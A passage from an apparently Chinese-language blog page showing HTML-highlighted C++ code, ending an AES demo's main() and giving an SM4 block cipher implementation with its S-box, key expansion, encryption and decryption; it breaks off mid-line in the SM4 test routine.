class="hljs-type">uint8_t</span> m[<span class="hljs-number">16</span>]={<span class="hljs-number">0</span>};<br>    cout&lt;&lt;<span class="hljs-string">"请输入明文(128bits):"</span>;<br>    cin&gt;&gt;mingwen;<br>    cout&lt;&lt;<span class="hljs-string">"请输入密文(128bits):"</span>;<br>    cin&gt;&gt;miwen;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">16</span>;i++)<br>    {<br>        m[i] = (<span class="hljs-type">uint8_t</span>)(mingwen[i]);<br>        key[i] = (<span class="hljs-type">uint8_t</span>)(miwen[i]);<br>    }<br>    <span class="hljs-type">uint8_t</span> c[<span class="hljs-number">16</span>]={<span class="hljs-number">0</span>};<br>    <span class="hljs-type">uint8_t</span> x[<span class="hljs-number">16</span>]={<span class="hljs-number">0</span>};<br>    <span class="hljs-type">uint32_t</span> new_key[<span class="hljs-number">44</span>]={<span class="hljs-number">0</span>};   <span class="hljs-comment">//存储44列密钥</span><br>    cout&lt;&lt;<span class="hljs-string">"明文:"</span>&lt;&lt;endl;<br>    <span class="hljs-built_in">Display</span>(m);<br>    cout&lt;&lt;<span class="hljs-string">"密钥:"</span>&lt;&lt;endl;<br>    <span class="hljs-built_in">Display</span>(key);<br>    <span class="hljs-built_in">get_TAB</span>();<span class="hljs-comment">//生成列混淆表</span><br>    <span class="hljs-built_in">KeyExpansion</span>(key,new_key);<br>    cout&lt;&lt;<span class="hljs-string">"生成密钥"</span>&lt;&lt;endl;<br>    <span class="hljs-comment">//DisplayKeys(new_key);</span><br>    <span class="hljs-built_in">Encrypt</span>(m,new_key,c);<br>    cout&lt;&lt;<span class="hljs-string">"加密结果"</span>&lt;&lt;endl;<br>    <span class="hljs-built_in">Display</span>(c);<br>    <span class="hljs-built_in">Decrypt</span>(c,new_key,x);<br>    cout&lt;&lt;<span class="hljs-string">"解密结果(hex)"</span>&lt;&lt;endl;<br>    <span class="hljs-built_in">Display</span>(x);<br>    cout&lt;&lt;<span class="hljs-string">"解密结果(string)"</span>&lt;&lt;endl;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">16</span>;i++)<br>        cout&lt;&lt;(<span class="hljs-type">char</span>)x[i];<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>}<br></code></pre></td></tr></tbody></table></figure><h2 id="SM4"><a href="#SM4" class="headerlink" title="SM4"></a>SM4</h2><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">"string.h"</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;string&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-function"><span class="hljs-type">uint32_t</span> <span class="hljs-title">shift_l</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> s,<span class="hljs-type">int</span> n)</span><span class="hljs-comment">//循环左移n位</span></span><br><span class="hljs-function"></span>{<br>    <span class="hljs-type">int</span> size=<span class="hljs-built_in">sizeof</span> (s)*<span class="hljs-number">8</span>;      <span class="hljs-comment">//字节数乘以8代表一共多少位</span><br>    <span class="hljs-keyword">return</span> s&lt;&lt;(n)|(s&gt;&gt;size-n);<br>}<br><span class="hljs-function"><span class="hljs-type">uint32_t</span> <span class="hljs-title">Sb</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> s)</span> </span>{<br><br>    <span class="hljs-type">uint8_t</span> SboxTable[<span class="hljs-number">16</span>][<span class="hljs-number">16</span>] =<br>            {<br>                    {<span class="hljs-number">0xd6</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0xe9</span>, <span class="hljs-number">0xfe</span>, <span class="hljs-number">0xcc</span>, <span class="hljs-number">0xe1</span>, <span class="hljs-number">0x3d</span>, <span class="hljs-number">0xb7</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0xb6</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0xc2</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0xfb</span>, <span class="hljs-number">0x2c</span>, <span class="hljs-number">0x05</span>},<br>                    {<span class="hljs-number">0x2b</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x9a</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0x2a</span>, <span class="hljs-number">0xbe</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0xc3</span>, <span class="hljs-number">0xaa</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x13</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x86</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x99</span>},<br>                    {<span class="hljs-number">0x9c</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0xf4</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0xef</span>, <span class="hljs-number">0x98</span>, <span class="hljs-number">0x7a</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x0b</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0xed</span>, <span class="hljs-number">0xcf</span>, <span class="hljs-number">0xac</span>, <span class="hljs-number">0x62</span>},<br>                    {<span class="hljs-number">0xe4</span>, <span class="hljs-number">0xb3</span>, <span class="hljs-number">0x1c</span>, <span class="hljs-number">0xa9</span>, <span class="hljs-number">0xc9</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0xe8</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0xdf</span>, <span class="hljs-number">0x94</span>, <span class="hljs-number">0xfa</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0x8f</span>, <span class="hljs-number">0x3f</span>, <span class="hljs-number">0xa6</span>},<br>                    {<span class="hljs-number">0x47</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0xa7</span>, <span class="hljs-number">0xfc</span>, <span class="hljs-number">0xf3</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0xba</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0x3c</span>, <span class="hljs-number">0x19</span>, <span class="hljs-number">0xe6</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0x4f</span>, <span class="hljs-number">0xa8</span>},<br>                    {<span class="hljs-number">0x68</span>, <span class="hljs-number">0x6b</span>, <span class="hljs-number">0x81</span>, <span class="hljs-number">0xb2</span>, <span class="hljs-number">0x71</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0xda</span>, <span class="hljs-number">0x8b</span>, <span class="hljs-number">0xf8</span>, <span class="hljs-number">0xeb</span>, <span class="hljs-number">0x0f</span>, <span class="hljs-number">0x4b</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0x9d</span>, <span class="hljs-number">0x35</span>},<br>                    {<span class="hljs-number">0x1e</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x0e</span>, <span class="hljs-number">0x5e</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0xd1</span>, <span class="hljs-number">0xa2</span>, <span class="hljs-number">0x25</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0x7c</span>, <span class="hljs-number">0x3b</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x87</span>},<br>                    {<span class="hljs-number">0xd4</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0x9f</span>, <span class="hljs-number">0xd3</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x4c</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0xe7</span>, <span class="hljs-number">0xa0</span>, <span class="hljs-number">0xc4</span>, <span class="hljs-number">0xc8</span>, <span class="hljs-number">0x9e</span>},<br>                    {<span class="hljs-number">0xea</span>, <span class="hljs-number">0xbf</span>, <span class="hljs-number">0x8a</span>, <span class="hljs-number">0xd2</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0xc7</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0xb5</span>, <span class="hljs-number">0xa3</span>, <span class="hljs-number">0xf7</span>, <span class="hljs-number">0xf2</span>, <span class="hljs-number">0xce</span>, <span class="hljs-number">0xf9</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x15</span>, <span class="hljs-number">0xa1</span>},<br>                    {<span class="hljs-number">0xe0</span>, <span class="hljs-number">0xae</span>, <span class="hljs-number">0x5d</span>, <span class="hljs-number">0xa4</span>, <span class="hljs-number">0x9b</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x1a</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0xad</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0xf5</span>, <span class="hljs-number">0x8c</span>, <span class="hljs-number">0xb1</span>, <span class="hljs-number">0xe3</span>},<br>                    {<span class="hljs-number">0x1d</span>, <span class="hljs-number">0xf6</span>, <span class="hljs-number">0xe2</span>, <span class="hljs-number">0x2e</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0xca</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0xc0</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0xab</span>, <span class="hljs-number">0x0d</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x4e</span>, <span class="hljs-number">0x6f</span>},<br>                    {<span class="hljs-number">0xd5</span>, <span class="hljs-number">0xdb</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0xde</span>, <span class="hljs-number">0xfd</span>, <span class="hljs-number">0x8e</span>, <span class="hljs-number">0x2f</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0xff</span>, <span class="hljs-number">0x6a</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0x6d</span>, <span class="hljs-number">0x6c</span>, <span class="hljs-number">0x5b</span>, <span class="hljs-number">0x51</span>},<br>                    {<span class="hljs-number">0x8d</span>, <span class="hljs-number">0x1b</span>, <span class="hljs-number">0xaf</span>, <span class="hljs-number">0x92</span>, <span class="hljs-number">0xbb</span>, <span class="hljs-number">0xdd</span>, <span class="hljs-number">0xbc</span>, <span class="hljs-number">0x7f</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0xd9</span>, <span class="hljs-number">0x5c</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x1f</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x5a</span>, <span class="hljs-number">0xd8</span>},<br>                    {<span class="hljs-number">0x0a</span>, <span class="hljs-number">0xc1</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0xa5</span>, <span class="hljs-number">0xcd</span>, <span class="hljs-number">0x7b</span>, <span class="hljs-number">0xbd</span>, <span class="hljs-number">0x2d</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0xd0</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0xb8</span>, <span class="hljs-number">0xe5</span>, <span class="hljs-number">0xb4</span>, <span class="hljs-number">0xb0</span>},<br>                    {<span class="hljs-number">0x89</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0x97</span>, <span class="hljs-number">0x4a</span>, <span class="hljs-number">0x0c</span>, <span class="hljs-number">0x96</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0x7e</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0xb9</span>, <span class="hljs-number">0xf1</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0xc5</span>, <span class="hljs-number">0x6e</span>, <span class="hljs-number">0xc6</span>, <span class="hljs-number">0x84</span>},<br>                    {<span class="hljs-number">0x18</span>, <span class="hljs-number">0xf0</span>, <span class="hljs-number">0x7d</span>, <span class="hljs-number">0xec</span>, <span class="hljs-number">0x3a</span>, <span class="hljs-number">0xdc</span>, <span class="hljs-number">0x4d</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x79</span>, <span class="hljs-number">0xee</span>, <span class="hljs-number">0x5f</span>, <span class="hljs-number">0x3e</span>, <span class="hljs-number">0xd7</span>, <span class="hljs-number">0xcb</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x48</span>}};<br>    <span class="hljs-type">uint8_t</span> a[<span class="hljs-number">4</span>];<br>    a[<span class="hljs-number">0</span>]=(s&gt;&gt;<span class="hljs-number">24</span>)&amp;<span class="hljs-number">0xff</span>;     <span class="hljs-comment">//最高8位</span><br>    a[<span class="hljs-number">1</span>]=(s&gt;&gt;<span class="hljs-number">16</span>)&amp;<span class="hljs-number">0xff</span>;<br>    a[<span class="hljs-number">2</span>]=(s&gt;&gt;<span class="hljs-number">8</span>)&amp;<span class="hljs-number">0xff</span>;<br>    a[<span class="hljs-number">3</span>]=s&amp;<span class="hljs-number">0xff</span>;<br>    <span class="hljs-type">uint8_t</span> b[<span class="hljs-number">4</span>];<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">4</span>;i++) {<br>        <span class="hljs-type">int</span> row = ((a[i] &gt;&gt; <span class="hljs-number">7</span>) &amp; <span class="hljs-number">1</span>) * <span class="hljs-number">8</span> + ((a[i] &gt;&gt; <span class="hljs-number">6</span>) &amp; <span class="hljs-number">1</span>) * <span class="hljs-number">4</span> + ((a[i] &gt;&gt; <span class="hljs-number">5</span>) &amp; <span class="hljs-number">1</span>) * <span class="hljs-number">2</span> + ((a[i] &gt;&gt; <span class="hljs-number">4</span>) &amp; <span class="hljs-number">1</span>) * <span class="hljs-number">1</span>;<br>        <span class="hljs-type">int</span> col = ((a[i] &gt;&gt; <span class="hljs-number">3</span>) &amp; <span class="hljs-number">1</span>) * <span class="hljs-number">8</span> + ((a[i] &gt;&gt; <span class="hljs-number">2</span>) &amp; <span class="hljs-number">1</span>) * <span class="hljs-number">4</span> + ((a[i] &gt;&gt; <span class="hljs-number">1</span>) &amp; <span class="hljs-number">1</span>) * <span class="hljs-number">2</span> + ((a[i]) &amp; <span class="hljs-number">1</span>) * <span class="hljs-number">1</span>;<br>        b[i] = SboxTable[row][col];<br>    }<br>    <span class="hljs-type">uint32_t</span> result;<br>    result=(b[<span class="hljs-number">0</span>]&lt;&lt;<span class="hljs-number">24</span>)|(b[<span class="hljs-number">1</span>]&lt;&lt;<span class="hljs-number">16</span>)|(b[<span class="hljs-number">2</span>]&lt;&lt;<span class="hljs-number">8</span>)|b[<span class="hljs-number">3</span>];<br>    <span class="hljs-keyword">return</span> result;<br>}<br><br><span class="hljs-function"><span class="hljs-type">uint32_t</span> <span class="hljs-title">L_change</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> s)</span></span><br><span class="hljs-function"></span>{<br>    <span class="hljs-keyword">return</span> s^ <span class="hljs-built_in">shift_l</span>(s,<span class="hljs-number">13</span>)^ <span class="hljs-built_in">shift_l</span>(s,<span class="hljs-number">23</span>);<br>}<br><br><span class="hljs-function"><span class="hljs-type">uint32_t</span> <span class="hljs-title">T_change</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> s)</span></span><br><span class="hljs-function"></span>{<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">L_change</span>(<span class="hljs-built_in">Sb</span>(s));<br>}<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">keyexpand</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> MK[<span class="hljs-number">4</span>],<span class="hljs-type">uint32_t</span> rk[<span class="hljs-number">32</span>])</span></span><br><span class="hljs-function"></span>{<br>    <span class="hljs-type">uint32_t</span> FK[<span class="hljs-number">4</span>]={<span class="hljs-number">0xA3B1BAC6</span>, <span class="hljs-number">0x56AA3350</span>,<span class="hljs-number">0x677D9197</span>, <span class="hljs-number">0xB27022DC</span>};<br>    <span class="hljs-type">uint32_t</span> CK[<span class="hljs-number">32</span>] = { <span class="hljs-number">0x00070E15</span>, <span class="hljs-number">0x1C232A31</span>, <span class="hljs-number">0x383F464D</span>, <span class="hljs-number">0x545B6269</span>,<br>                        <span class="hljs-number">0x70777E85</span>, <span class="hljs-number">0x8C939AA1</span>, <span class="hljs-number">0xA8AFB6BD</span>, <span class="hljs-number">0xC4CBD2D9</span>,<br>                        <span class="hljs-number">0xE0E7EEF5</span>, <span class="hljs-number">0xFC030A11</span>, <span class="hljs-number">0x181F262D</span>, <span class="hljs-number">0x343B4249</span>,<br>                        <span class="hljs-number">0x50575E65</span>, <span class="hljs-number">0x6C737A81</span>, <span class="hljs-number">0x888F969D</span>, <span class="hljs-number">0xA4ABB2B9</span>,<br>                        <span class="hljs-number">0xC0C7CED5</span>, <span class="hljs-number">0xDCE3EAF1</span>, <span class="hljs-number">0xF8FF060D</span>, <span class="hljs-number">0x141B2229</span>,<br>                        <span class="hljs-number">0x30373E45</span>, <span class="hljs-number">0x4C535A61</span>, <span class="hljs-number">0x686F767D</span>, <span class="hljs-number">0x848B9299</span>,<br>                        <span class="hljs-number">0xA0A7AEB5</span>, <span class="hljs-number">0xBCC3CAD1</span>, <span class="hljs-number">0xD8DFE6ED</span>, <span class="hljs-number">0xF4FB0209</span>,<br>                        <span class="hljs-number">0x10171E25</span>, <span class="hljs-number">0x2C333A41</span>, <span class="hljs-number">0x484F565D</span>, <span class="hljs-number">0x646B7279</span> };<br>    <span class="hljs-type">uint32_t</span> k[<span class="hljs-number">4</span>]={MK[<span class="hljs-number">0</span>]^FK[<span class="hljs-number">0</span>],MK[<span class="hljs-number">1</span>]^FK[<span class="hljs-number">1</span>],MK[<span class="hljs-number">2</span>]^FK[<span class="hljs-number">2</span>],MK[<span class="hljs-number">3</span>]^FK[<span class="hljs-number">3</span>]};<br>    <span class="hljs-type">uint32_t</span> K[<span class="hljs-number">36</span>];<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;=<span class="hljs-number">3</span>;i++)<br>        K[i]=k[i];<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">32</span>;i++)<br>    {<br>        K[i+<span class="hljs-number">4</span>]=K[i]^ <span class="hljs-built_in">T_change</span>(K[i+<span class="hljs-number">1</span>]^K[i+<span class="hljs-number">2</span>]^K[i+<span class="hljs-number">3</span>]^CK[i]);<br>    }<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">32</span>;i++)<br>        rk[i]=K[i+<span class="hljs-number">4</span>];<br><br>}<br><br><span class="hljs-function"><span class="hljs-type">uint32_t</span> <span class="hljs-title">Lchange</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> s)</span></span><br><span class="hljs-function"></span>{<br>    <span class="hljs-keyword">return</span> s^<span class="hljs-built_in">shift_l</span>(s,<span class="hljs-number">2</span>)^<span class="hljs-built_in">shift_l</span>(s,<span class="hljs-number">10</span>)^<span class="hljs-built_in">shift_l</span>(s,<span class="hljs-number">18</span>)^<span class="hljs-built_in">shift_l</span>(s,<span class="hljs-number">24</span>);<br>}<br><br><span class="hljs-function"><span class="hljs-type">uint32_t</span> <span class="hljs-title">Tchange</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> s)</span></span><br><span class="hljs-function"></span>{<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">Lchange</span>(<span class="hljs-built_in">Sb</span>(s));<br>}<br><br><span class="hljs-function"><span class="hljs-type">uint32_t</span> <span class="hljs-title">fround</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> X[<span class="hljs-number">4</span>],<span class="hljs-type">uint32_t</span> rk)</span></span><br><span class="hljs-function"></span>{<br>    <span class="hljs-type">uint32_t</span> B=X[<span class="hljs-number">1</span>]^X[<span class="hljs-number">2</span>]^X[<span class="hljs-number">3</span>]^rk;<br>    <span class="hljs-keyword">return</span> X[<span class="hljs-number">0</span>]^ <span class="hljs-built_in">L_change</span>(<span class="hljs-built_in">Sb</span>(B));<br>}<br><br><span class="hljs-type">static</span> <span class="hljs-type">uint32_t</span> out1[<span class="hljs-number">4</span>];<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">SM4</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> X[<span class="hljs-number">4</span>],<span class="hljs-type">uint32_t</span> rk[<span class="hljs-number">32</span>])</span></span><br><span class="hljs-function"></span>{<br>    <span class="hljs-type">uint32_t</span> Y[<span class="hljs-number">36</span>];<br>    Y[<span class="hljs-number">0</span>]=X[<span class="hljs-number">0</span>];<br>    Y[<span class="hljs-number">1</span>]=X[<span class="hljs-number">1</span>];<br>    Y[<span class="hljs-number">2</span>]=X[<span class="hljs-number">2</span>];<br>    Y[<span class="hljs-number">3</span>]=X[<span class="hljs-number">3</span>];<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;=<span class="hljs-number">31</span>;i++) {<br>        Y[i + <span class="hljs-number">4</span>] = Y[i] ^ <span class="hljs-built_in">Tchange</span>(Y[i + <span class="hljs-number">1</span>] ^ Y[i + <span class="hljs-number">2</span>] ^ Y[i + <span class="hljs-number">3</span>] ^ rk[i]);<br>    }<br><span class="hljs-comment">//    for(int i=0;i&lt;36;i++) {</span><br><span class="hljs-comment">//        printf("第%d轮:%x \n",i,Y[i]);</span><br><span class="hljs-comment">//    }</span><br>    out1[<span class="hljs-number">0</span>]=Y[<span class="hljs-number">35</span>];<br>    out1[<span class="hljs-number">1</span>]=Y[<span class="hljs-number">34</span>];<br>    out1[<span class="hljs-number">2</span>]=Y[<span class="hljs-number">33</span>];<br>    out1[<span class="hljs-number">3</span>]=Y[<span class="hljs-number">32</span>];<br>}<br><br><span class="hljs-type">static</span> <span class="hljs-type">uint32_t</span> out2[<span class="hljs-number">4</span>];<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">sm4</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> Y[<span class="hljs-number">4</span>],<span class="hljs-type">uint32_t</span> rk[<span class="hljs-number">32</span>])</span></span><br><span class="hljs-function"></span>{<br>    <span class="hljs-type">uint32_t</span> X[<span class="hljs-number">36</span>];<br>    X[<span class="hljs-number">35</span>]=Y[<span class="hljs-number">0</span>];<br>    X[<span class="hljs-number">34</span>]=Y[<span class="hljs-number">1</span>];<br>    X[<span class="hljs-number">33</span>]=Y[<span class="hljs-number">2</span>];<br>    X[<span class="hljs-number">32</span>]=Y[<span class="hljs-number">3</span>];<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">31</span>;i&gt;=<span class="hljs-number">0</span>;i--)<br>    {<br>        X[i]=X[i+<span class="hljs-number">4</span>]^ <span class="hljs-built_in">Tchange</span>(X[i+<span class="hljs-number">3</span>]^X[i+<span class="hljs-number">2</span>]^X[i+<span class="hljs-number">1</span>]^rk[i]);<br>    }<br>    out2[<span class="hljs-number">0</span>]=X[<span class="hljs-number">0</span>];<br>    out2[<span class="hljs-number">1</span>]=X[<span class="hljs-number">1</span>];<br>    out2[<span class="hljs-number">2</span>]=X[<span class="hljs-number">2</span>];<br>    out2[<span class="hljs-number">3</span>]=X[<span class="hljs-number">3</span>];<br>}<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{<br>    <span class="hljs-type">uint32_t</span> ming[<span class="hljs-number">4</span>]={<span class="hljs-number">0x01234567</span>,<span class="hljs-number">0x89ABCDEF</span>,<span class="hljs-number">0xFEDCBA98</span>,<span class="hljs-number">0x76543210</span>};<br>    cout&lt;&lt;<span class="hljs-string">"明文:"</span>&lt;&lt;endl;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">4</span>;i++)<br>        cout&lt;&lt;hex&lt;&lt;ming[i]&lt;&lt;<span class="hljs-string">" "</span>;<br>    cout&lt;&lt;endl;<br>    <span class="hljs-type">uint32_t</span> MK[<span class="hljs-number">4</span>]={<span class="hljs-number">0x01234567</span>,<span class="hljs-number">0x89ABCDEF</span>,<span class="hljs-number">0xFEDCBA98</span>,<span class="hljs-number">0x76543210</span>};<br>    cout&lt;&lt;<span class="hljs-string">"密钥："</span>&lt;&lt;endl;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">4</span>;i++)<br>        cout&lt;&lt;hex&lt;&lt;MK[i]&lt;&lt;<span class="hljs-string">" "</span>;<br>    cout&lt;&lt;endl;<br>    <span class="hljs-type">uint32_t</span> rk[<span class="hljs-number">32</span>];<br>    <span class="hljs-built_in">keyexpand</span>(MK,rk);<br><span class="hljs-comment">//    cout&lt;&lt;"扩展密钥："&lt;&lt;endl;</span><br><span class="hljs-comment">//    for(int i=0;i&lt;32;i++)</span><br><span class="hljs-comment">//        cout&lt;&lt;i&lt;&lt;"轮扩展密钥"&lt;&lt;rk[i]&lt;&lt;endl;</span><br>    cout&lt;&lt;<span class="hljs-string">"加密结果："</span>&lt;&lt;endl;<br>    <span class="hljs-built_in">SM4</span>(ming,rk);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span 